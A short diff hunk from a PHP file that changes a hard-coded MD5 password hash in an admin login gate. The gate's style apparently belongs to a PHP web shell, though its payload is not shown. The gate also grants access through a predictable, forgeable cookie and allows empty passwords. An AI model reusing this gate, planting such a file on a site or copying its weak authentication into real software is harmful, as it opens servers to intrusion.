@@ -12,7 +12,7 @@ function admin_login() {
 	echo'</form>';
 exit; }
 
-$password = "37bd8d4f5adc469f75bdc73b2f8edccc"; // asu
+$password = "0d4edbb506b8c68ddaa0eb12928d5d9f"; // asu
 if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
 	if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password))) {
 		setcookie(md5($_SERVER['HTTP_HOST']), true);
